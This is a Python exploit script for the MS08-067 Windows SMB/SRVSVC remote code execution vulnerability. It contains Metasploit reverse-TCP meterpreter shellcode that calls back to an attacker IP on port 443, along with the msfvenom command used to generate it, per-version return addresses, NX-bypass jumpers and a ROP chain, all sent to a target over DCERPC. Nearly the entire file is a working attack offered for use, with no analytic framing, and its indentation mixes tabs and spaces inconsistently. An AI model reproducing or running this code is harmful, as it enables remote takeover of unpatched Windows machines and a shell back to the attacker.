import struct
import time
import sys
from threading import Thread    
try:
    from impacket import smb
    from impacket import uuid
    from impacket import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError as _:
    print('Install the following library to make this script work')
    print('Impacket : http://oss.coresecurity.com/projects/impacket.html')
    print('PyCrypto : http://www.amk.ca/python/code/crypto.html')
    sys.exit(1)


print('#######################################################################')
print('#   MS08-067 Exploit')
print('#   Python3 Version Coded By Chin Yi Zhe')
print('#######################################################################\n')


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x43\xb5\xc3\xb4\x83\xee\xfc"
shellcode += b"\xe2\xf4\xbf\x5d\x41\xb4\x43\xb5\xa3\x3d\xa6"
shellcode += b"\x84\x03\xd0\xc8\xe5\xf3\x3f\x11\xb9\x48\xe6"
shellcode += b"\x57\x3e\xb1\x9c\x4c\x02\x89\x92\x72\x4a\x6f"
shellcode += b"\x88\x22\xc9\xc1\x98\x63\x74\x0c\xb9\x42\x72"
shellcode += b"\x21\x46\x11\xe2\x48\xe6\x53\x3e\x89\x88\xc8"
shellcode += b"\xf9\xd2\xcc\xa0\xfd\xc2\x65\x12\x3e\x9a\x94"
shellcode += b"\x42\x66\x48\xfd\x5b\x56\xf9\xfd\xc8\x81\x48"
shellcode += b"\xb5\x95\x84\x3c\x18\x82\x7a\xce\xb5\x84\x8d"
shellcode += b"\x23\xc1\xb5\xb6\xbe\x4c\x78\xc8\xe7\xc1\xa7"
shellcode += b"\xed\x48\xec\x67\xb4\x10\xd2\xc8\xb9\x88\x3f"
shellcode += b"\x1b\xa9\xc2\x67\xc8\xb1\x48\xb5\x93\x3c\x87"
shellcode += b"\x90\x67\xee\x98\xd5\x1a\xef\x92\x4b\xa3\xea"
shellcode += b"\x9c\xee\xc8\xa7\x28\x39\x1e\xdd\xf0\x86\x43"
shellcode += b"\xb5\xab\xc3\x30\x87\x9c\xe0\x2b\xf9\xb4\x92"
shellcode += b"\x44\x4a\x16\x0c\xd3\xb4\xc3\xb4\x6a\x71\x97"
shellcode += b"\xe4\x2b\x9c\x43\xdf\x43\x4a\x16\xe4\x13\xe5"
shellcode += b"\x93\xf4\x13\xf5\x93\xdc\xa9\xba\x1c\x54\xbc"
shellcode += b"\x60\x54\xde\x46\xdd\xc9\xbe\x4d\xbd\xab\xb6"
shellcode += b"\x43\xb4\x78\x3d\xa5\xdf\xd3\xe2\x14\xdd\x5a"
shellcode += b"\x11\x37\xd4\x3c\x61\xc6\x75\xb7\xb8\xbc\xfb"
shellcode += b"\xcb\xc1\xaf\xdd\x33\x01\xe1\xe3\x3c\x61\x2b"
shellcode += b"\xd6\xae\xd0\x43\x3c\x20\xe3\x14\xe2\xf2\x42"
shellcode += b"\x29\xa7\x9a\xe2\xa1\x48\xa5\x73\x07\x91\xff"
shellcode += b"\xb5\x42\x38\x87\x90\x53\x73\xc3\xf0\x17\xe5"
shellcode += b"\x95\xe2\x15\xf3\x95\xfa\x15\xe3\x90\xe2\x2b"
shellcode += b"\xcc\x0f\x8b\xc5\x4a\x16\x3d\xa3\xfb\x95\xf2"
shellcode += b"\xbc\x85\xab\xbc\xc4\xa8\xa3\x4b\x96\x0e\x23"
shellcode += b"\xa9\x69\xbf\xab\x12\xd6\x08\x5e\x4b\x96\x89"
shellcode += b"\xc5\xc8\x49\x35\x38\x54\x36\xb0\x78\xf3\x50"
shellcode += b"\xc7\xac\xde\x43\xe6\x3c\x61"

nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print('Windows XP SP0/SP1 Universal\n')
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print('Windows 2000 Universal\n')
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print('Windows 2003 SP0 Universal\n')
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print('Windows 2003 SP1 English\n')
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print('Windows XP SP3 French (NX)\n')
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print('Windows XP SP3 English (NX)\n')
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print('Windows XP SP3 English (AlwaysOn NX)\n')
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print('Not supported OS version\n')
		sys.exit(-1)
	print('[-]Initiating connection')

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print('Exploit finish\n')



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print('\nUsage: %s <target ip>\n' % sys.argv[0])

				print('Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n')
				print('Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n')

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
